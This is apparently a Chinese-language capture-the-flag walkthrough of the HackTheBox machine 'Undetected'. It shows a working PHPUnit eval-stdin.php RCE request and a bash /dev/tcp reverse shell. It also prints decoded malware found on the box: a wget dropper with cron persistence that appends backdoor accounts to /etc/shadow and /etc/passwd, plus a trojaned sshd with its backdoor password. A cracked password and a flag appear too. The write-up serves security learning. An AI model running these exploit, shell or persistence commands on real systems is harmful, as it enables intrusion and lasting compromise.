\\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://store.djewelry.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\njs                      [Status: 301, Size: 321, Words: 20, Lines: 10]\nimages                  [Status: 301, Size: 325, Words: 20, Lines: 10]\ncss                     [Status: 301, Size: 322, Words: 20, Lines: 10]\nfonts                   [Status: 301, Size: 324, Words: 20, Lines: 10]\nvendor                  [Status: 301, Size: 325, Words: 20, Lines: 10]\nserver-status           [Status: 403, Size: 283, Words: 20, Lines: 10]\n                        [Status: 200, Size: 6215, Words: 528, Lines: 196]\n:: Progress: [20116/20116] :: Job [1/1] :: 106 req/sec :: Duration: [0:03:03] :: Errors: 0 ::\n```\n挨个查看一下\n\n![](Hackthebox-Undetected/2042b883-e106-40d4-8a66-80c327edc8cd.png)\n\n在vendor里有不少东西，有点意思\n\n![](Hackthebox-Undetected/9f9d4342-d311-4a93-bd1a-d3362669c6a6.png)\n\n/vendor/phpunit/phpunit/\n\n在这个路径中可以看到版本更新记录，最后一个版本是5.6，查看一下ChangeLog-5.6.md\n\n```bash\n# Changes in PHPUnit 5.6\n\nAll notable changes of the PHPUnit 5.6 release series are documented in this file using the [Keep a CHANGELOG](http://keepachangelog.com/) principles.\n\n## [5.6.2] - 2016-10-25\n\nNew PHAR release due to updated dependencies\n\n## [5.6.1] - 2016-10-07\n\n### Fixed\n\n* Fixed [#2320](https://github.com/sebastianbergmann/phpunit/issues/2320): Conflict between `PHPUnit_Framework_TestCase::getDataSet()` and `PHPUnit_Extensions_Database_TestCase::getDataSet()`\n\n## [5.6.0] - 2016-10-07\n\n### Added\n\n* Merged [#2240](https://github.com/sebastianbergmann/phpunit/pull/2240): Provide access to a test case's data set (for use in `setUp()`, for instance)\n* Merged [#2262](https://github.com/sebastianbergmann/phpunit/pull/2262): Add the `PHPUnit_Framework_Constraint_DirectoryExists`, `PHPUnit_Framework_Constraint_IsReadable`, and `PHPUnit_Framework_Constraint_IsWritable` constraints as well as the `assertIsReadable()`, `assertNotIsReadable()`, `assertIsWritable()`, `assertNotIsWritable()`, `assertDirectoryExists()`, `assertDirectoryNotExists()`, `assertDirectoryIsReadable()`, `assertDirectoryNotIsReadable()`, `assertDirectoryIsWritable()`, `assertDirectoryNotIsWritable()`, `assertFileIsReadable()`, `assertFileNotIsReadable()`, `assertFileIsWritable()`, and `assertFileNotIsWritable()` assertions\n* Added `PHPUnit\\Framework\\TestCase::createConfiguredMock()` based on [idea](https://twitter.com/kriswallsmith/status/763550169090625536) by Kris Wallsmith\n* Added the `@doesNotPerformAssertions` annotation for excluding a test from the \"useless test\" risky test check\n\n### Changed\n\n* Deprecated `PHPUnit\\Framework\\TestCase::setExpectedExceptionRegExp()`\n* `PHPUnit_Util_Printer` no longer optionally cleans up HTML output using `ext/tidy`\n\n[5.6.2]: https://github.com/sebastianbergmann/phpunit/compare/5.6.1...5.6.2\n[5.6.1]: https://github.com/sebastianbergmann/phpunit/compare/5.6.0...5.6.1\n[5.6.0]: https://github.com/sebastianbergmann/phpunit/compare/5.5...5.6.0\n```\n这边给出了一个更新时间，最后一次是在2016-10-25，那咱们看看PHPUnit在这个时间之后的漏洞就可以了\n\n![](Hackthebox-Undetected/ce64892a-f0de-434a-bc7f-7116b64abb57.png)\n\n这边搜索后可以看到有一个CVE-2017-9841是符合我们的条件的\n\n## 漏洞利用\n### Exploit\n```bash\nhttp://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n```\n> [https://www.cvedetails.com/cve/CVE-2017-9841/](https://www.cvedetails.com/cve/CVE-2017-9841/)\n\n> [https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.zh-cn.md)\n\n根据上面对该漏洞的描述，在vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php处进行利用，咱们抓个包进行一次尝试\n\n![](Hackthebox-Undetected/2e2b50fa-6df0-49cb-a9d7-6b9f86a361ef.png)\n\n在下方加入然后放包执行\n\n![](Hackthebox-Undetected/af5e7041-08e9-4148-9cf5-e83e4ec312e9.png)\n\n成功被执行了\n\n现在咱们来想办法构造一下命令\n\n```bash\nGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: store.djewelry.htb\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Length: 24\n\n<?php system(\"whoami\")?>\n```\n![](Hackthebox-Undetected/d24cb124-c76f-4f88-90d9-fff3f762f116.png)\n\n成功执行命令，但是有点麻烦，用curl看看能不能成功吧\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# curl http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --data \"<?php system('whoami')?>\"\nwww-data\n```\nOK，成功执行命令，那么现在来构造poc回弹shell吧\n\n### Shell\n使用nc监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n```bash\n<?php system('/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.24/4444 0>&1\"')?>\n```\n在burp里执行即可获得shell\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.24] from (UNKNOWN) [10.10.11.146] 56644\nbash: cannot set terminal process group (865): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ python3 -c \"import pty;pty.spawn('/bin/bash')\";\n<HP$ python3 -c \"import pty;pty.spawn('/bin/bash')\";                    \nwww-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ whoami&&id\n<ore/vendor/phpunit/phpunit/src/Util/PHP$ whoami&&id                    \nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n成功拿到一个shell\n\n```bash\nCtrl+Z返回\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 51 cols 237\n```\n修复一下shell\n\n## 权限提升\n### User\n```bash\nwww-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ grep 'bash' /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nsteven:x:1000:1000:Steven Wright:/home/steven:/bin/bash\nsteven1:x:1000:1000:,,,:/home/steven:/bin/bash\n```\n咱们的提权目标就在steven和steven1这两个用户上了\n\n```bash\nwww-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cd /home\nwww-data@production:/home$ ls\nsteven\nwww-data@production:/home$ cd steven\nbash: cd: steven: Permission denied\nwww-data@production:/home$ ls -la\ntotal 12\ndrwxr-xr-x  3 root   root   4096 Feb  8 19:59 .\ndrwxr-xr-x 19 root   root   4096 Feb  8 19:59 ..\ndrwxr-x---  5 steven steven 4096 Feb  8 19:59 steven\n```\n没有权限进入steven用户目录，这里暂时没有思路了，跑一个Linpeas看看\n\nlinpeas跑出来的结果比较多，就不全贴出来了，其中看到一个\n\n/var/backups/info存在一个这个文件，并且还是www-data权限的，去看看\n\n```bash\nwww-data@production:/var/backups$ ls -la\ntotal 72\ndrwxr-xr-x  2 root     root      4096 Feb 24 23:49 .\ndrwxr-xr-x 13 root     root      4096 Feb  8 19:59 ..\n-rw-r--r--  1 root     root     34011 Feb  8 19:05 apt.extended_states.0\n-r-x------  1 www-data www-data 27296 May 14  2021 info\nwww-data@production:/var/backups$ file info \ninfo: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped\n```\n这是一个二进制文件，查看一下\n\n```bash\n776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b\n```\n在一大堆乱码中找到了这么一串十六进制字符\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# echo \"776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b\" | xxd -r -p\nwget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo \"* 3 * * * root /var/lib/.main\" >> /etc/crontab; awk -F\":\" '$7 == \"/bin/bash\" && $3 >= 1000 {system(\"echo \"$1\"1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow\")}' /etc/passwd; awk -F\":\" '$7 == \"/bin/bash\" && $3 >= 1000 {system(\"echo \"$1\" \"$3\" \"$6\" \"$7\" > users.txt\")}' /etc/passwd; while read -r user group home shell _; do echo \"$user\"1\":x:$group:$group:,,,:$home:$shell\" >> /etc/passwd; done < users.txt; rm users.txt;\n```\n我们将它转为ASCII格式\n\n提取出这么一串hash，然后稍微修改一下\n\n```bash\n$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/\n```\n然后再读取中知道了这一串应该是setven1的密码，去使用john爆破一下试试\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nihatehackers     (?)\n1g 0:00:00:55 DONE (2022-02-25 01:39) 0.01789g/s 1594p/s 1594c/s 1594C/s jojo95..halo03\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n```\n得到了setven1的密码\n\n```bash\nusername = steven1\npassword = ihatehackers\n```\n使用ssh进行连接\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh steven1@10.10.11.146\nsteven1@10.10.11.146's password: \nsteven@production:~$ whoami&&id\nsteven\nuid=1000(steven) gid=1000(steven) groups=1000(steven)\n```\n成功获得user权限\n\n```bash\nsteven@production:~$ ls\nuser.txt\nsteven@production:~$ cat user.txt \ne27e4aba73ab8ba7421550905082163e\n```\n成功获得user权限的flag文件\n\n### Root\nsudo -l提示失败，那就跑个linpeas.sh看看情况吧\n\n```bash\n[+] Mails (limit 50)\n    17793      4 -rw-rw----   1 steven   mail          966 Jul 25  2021 /var/mail/steven                                                                                                                            \n    17793      4 -rw-rw----   1 steven   mail          966 Jul 25  2021 /var/spool/mail/steven\n```\n看到两个关于邮件的信息，查看一下\n\n```bash\nsteven@production:~$ cat /var/mail/steven\nFrom root@production  Sun, 25 Jul 2021 10:31:12 GMT\nReturn-Path: <root@production>\nReceived: from production (localhost [127.0.0.1])\n        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847\n        for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT\nReceived: (from root@localhost)\n        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;\n        Sun, 25 Jul 2021 10:31:12 GMT\nDate: Sun, 25 Jul 2021 10:31:12 GMT\nMessage-Id: <202107251031.80FAcdZ171847@production>\nTo: steven@production\nFrom: root@production\nSubject: Investigations\n\nHi Steven.\n\nWe recently updated the system but are still experiencing some strange behaviour with the Apache service.\nWe have temporarily moved the web store and database to another server whilst investigations are underway.\nIf for any reason you need access to the database or web application code, get in touch with Mark and he\nwill generate a temporary password for you to authenticate to the temporary server.\n\nThanks,\nsysadmin\n```\n这里大概意思是说最近更新了一下系统，但是在apache上有点奇怪的问题，所以暂时把商城和数据库搬迁到另一台服务器上了，正在排查原因，如果我们需要访问的话可以联系Mark，他会给我们一个临时密码的\n\n这里我猜测应该是做邮件伪造了\n\n不过我们还是先去看看apache服务吧\n\napache服务目录位于/usr/lib\n\n```bash\nsteven@production:~$ ls -la /usr/lib/apache2/\ntotal 28\ndrwxr-xr-x  3 root root  4096 Jul  5  2021 .\ndrwxr-xr-x 82 root root  4096 Feb  8 19:59 ..\ndrwxr-xr-x  2 root root 20480 Jan 28 21:05 modules\n```\n我们对这个目录有读取和执行权限，还不错，去看看\n\n```bash\nsteven@production:/usr/lib/apache2/modules$ ls -la\ntotal 8796\ndrwxr-xr-x 2 root root   20480 Jan 28 21:05 .\ndrwxr-xr-x 3 root root    4096 Jul  5  2021 ..\n-rw-r--r-- 1 root root   15925 Jan  5 14:49 httpd.exp\n-rw-r--r-- 1 root root 4625776 Nov 25 23:16 libphp7.4.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_access_compat.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_actions.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_alias.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_allowmethods.so\n-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_asis.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_auth_basic.so\n-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_auth_digest.so\n-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_auth_form.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_anon.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_core.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_dbd.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_dbm.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_file.so\n-rw-r--r-- 1 root root   22768 Jan  5 14:49 mod_authn_socache.so\n-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_authnz_fcgi.so\n-rw-r--r-- 1 root root   55528 Jan  5 14:49 mod_authnz_ldap.so\n-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_authz_core.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_dbd.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_dbm.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_groupfile.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_host.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_owner.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_user.so\n-rw-r--r-- 1 root root   43216 Jan  5 14:49 mod_autoindex.so\n-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_brotli.so\n-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_bucketeer.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_buffer.so\n-rw-r--r-- 1 root root   80176 Jan  5 14:49 mod_cache.so\n-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_cache_disk.so\n-rw-r--r-- 1 root root   39152 Jan  5 14:49 mod_cache_socache.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_case_filter.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_case_filter_in.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_cern_meta.so\n-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_cgi.so\n-rw-r--r-- 1 root root   43216 Jan  5 14:49 mod_cgid.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_charset_lite.so\n-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_data.so\n-rw-r--r-- 1 root root  104656 Jan  5 14:49 mod_dav.so\n-rw-r--r-- 1 root root   59600 Jan  5 14:49 mod_dav_fs.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_dav_lock.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_dbd.so\n-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_deflate.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_dialup.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_dir.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_dumpio.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_echo.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_env.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_expires.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_ext_filter.so\n-rw-r--r-- 1 root root   14592 Jan  5 14:49 mod_file_cache.so\n-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_filter.so\n-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_headers.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_heartbeat.so\n-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_heartmonitor.so\n-rw-r--r-- 1 root root  253632 Jan  5 14:49 mod_http2.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_ident.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_imagemap.so\n-rw-r--r-- 1 root root   55504 Jan  5 14:49 mod_include.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_info.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_lbmethod_bybusyness.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_lbmethod_byrequests.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_lbmethod_bytraffic.so\n-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_lbmethod_heartbeat.so\n-rw-r--r-- 1 root root   84176 Jan  5 14:49 mod_ldap.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_log_debug.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_log_forensic.so\n-rw-r--r-- 1 root root  134544 Jan  5 14:49 mod_lua.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_macro.so\n-rw-r--r-- 1 root root  260672 Jan  5 14:49 mod_md.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_mime.so\n-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_mime_magic.so\n-rw-r--r-- 1 root root   67792 Jan  5 14:49 mod_mpm_event.so\n-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_mpm_prefork.so\n-rw-r--r-- 1 root root   47312 Jan  5 14:49 mod_mpm_worker.so\n-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_negotiation.so\n-rw-r--r-- 1 root root  133888 Jan  5 14:49 mod_proxy.so\n-rw-r--r-- 1 root root   55504 Jan  5 14:49 mod_proxy_ajp.so\n-rw-r--r-- 1 root root   59600 Jan  5 14:49 mod_proxy_balancer.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_proxy_connect.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_proxy_express.so\n-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_proxy_fcgi.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_proxy_fdpass.so\n-rw-r--r-- 1 root root   47312 Jan  5 14:49 mod_proxy_ftp.so\n-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_proxy_hcheck.so\n-rw-r--r-- 1 root root   39152 Jan  5 14:49 mod_proxy_html.so\n-rw-r--r-- 1 root root   47312 Jan  5 14:49 mod_proxy_http.so\n-rw-r--r-- 1 root root   67936 Jan  5 14:49 mod_proxy_http2.so\n-rw-r--r-- 1 root root   22768 Jan  5 14:49 mod_proxy_scgi.so\n-rw-r--r-- 1 root root   22656 Jan  5 14:49 mod_proxy_uwsgi.so\n-rw-r--r-- 1 root root   18560 Jan  5 14:49 mod_proxy_wstunnel.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_ratelimit.so\n-rw-r--r-- 1 root root   34800 May 17  2021 mod_reader.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_reflector.so\n-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_remoteip.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_reqtimeout.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_request.so\n-rw-r--r-- 1 root root   75984 Jan  5 14:49 mod_rewrite.so\n-rw-r--r-- 1 root root   43216 Jan  5 14:49 mod_sed.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_session.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_session_cookie.so\n-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_session_crypto.so\n-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_session_dbd.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_setenvif.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_slotmem_plain.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_slotmem_shm.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_socache_dbm.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_socache_memcache.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_socache_redis.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_socache_shmcb.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_speling.so\n-rw-r--r-- 1 root root  248240 Jan  5 14:49 mod_ssl.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_status.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_substitute.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_suexec.so\n-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_unique_id.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_userdir.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_usertrack.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_vhost_alias.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_xml2enc.so\n```\n文件有点多啊，那么稍微筛选一下，按照最近修改来排序\n\n```bash\nsteven@production:/usr/lib/apache2/modules$ ls --full-time -i | sort -u\n 2050 -rw-r--r-- 1 root root   34800 2021-05-17 07:10:04.000000000 +0000 mod_reader.so\n```\n就是这个文件了，我们把它下载下来看看\n\n```bash\nscp steven1@10.10.11.146:/usr/lib/apache2/modules/mod_reader.so ~/Desktop\n```\n下载下来后，在mod\\_reader.so中提取到一段base64码\n\n```bash\nd2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk\n```\n给解析一下\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# echo -n 'd2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk' | base64 -d\nwget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd\n```\n这边是把这张图片传输到sshd，去下载下来\n\n使用ghidra打开进行逆向\n\n![](Hackthebox-Undetected/e151a5a6-d502-473f-9bbc-85c89c7b4278.png)\n\n从这里可以看出来，我们的密码是31位\n\n```bash\nbackdoor._28_2_ = 0xa9f4;\nbackdoor._24_4_ = 0xbcf0b5e3;\nbackdoor._16_8_ = 0xb2d6f4a0fda0b3d6;\nbackdoor[30] = -0x5b;\nbackdoor._0_4_ = 0xf0e7abd6;\nbackdoor._4_4_ = 0xa4b3a3f3;\nbackdoor._8_4_ = 0xf7bbfdc8;\nbackdoor._12_4_ = 0xfdb3d6e7;\n```\n我们给它排序一下，从高到低排序\n\n```bash\nbackdoor[30] = -0x5b;\nbackdoor._28_2_ = 0xa9f4;\nbackdoor._24_4_ = 0xbcf0b5e3;\nbackdoor._16_8_ = 0xb2d6f4a0fda0b3d6;\nbackdoor._12_4_ = 0xfdb3d6e7;\nbackdoor._8_4_ = 0xf7bbfdc8;\nbackdoor._4_4_ = 0xa4b3a3f3;\nbackdoor._0_4_ = 0xf0e7abd6;\n```\n```bash\n0x5b\n0xa9f4\n0xbcf0b5e3\n0xb2d6f4a0fda0b3d6\n0xfdb3d6e7\n0xf7bbfdc8\n0xa4b3a3f3\n0xf0e7abd6\n```\n这边排序好以后，右键查看一下0x5b\n\n![](Hackthebox-Undetected/fa67391c-212f-4e76-9b01-1a5d250c88f7.png)\n\n发现正确的应该是0xa5，修改一下后去做一下编码\n\n首先转化成HEX再转化为XOR\n\n> [https://gchq.github.io/CyberChef/#recipe=Swap\\_endianness('Hex',31,true)From\\_Hex('Auto')XOR({'option':'Hex','string':'96'},'Standard',false)&input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,true)From_Hex('Auto')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)&input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg)\n\n这是最终改出来的效果，点开即可看到我的结果\n\n```bash\n0xa5\n0xa9f4\n0xbcf0b5e3\n0xb2d6f4a0fda0b3d6\n0xfdb3d6e7\n0xf7bbfdc8\n0xa4b3a3f3\n0xf0e7abd6\n```\n```bash\n@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3\n```\n得到了backdoor的密码\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh root@10.10.11.146                                   \nThe authenticity of host '10.10.11.146 (10.10.11.146)' can't be established.\nECDSA key fingerprint is SHA256:2jPT4mThqEcnA/qjjQsIWwy2QNwGObWQX5MjK5YNvCM.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.146' (ECDSA) to the list of known hosts.\nroot@10.10.11.146's password: \nLast login: Fri Feb 25 12:56:49 2022 from 10.10.14.76\nroot@production:~# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功提权到root\n\n```bash\nroot@production:~# 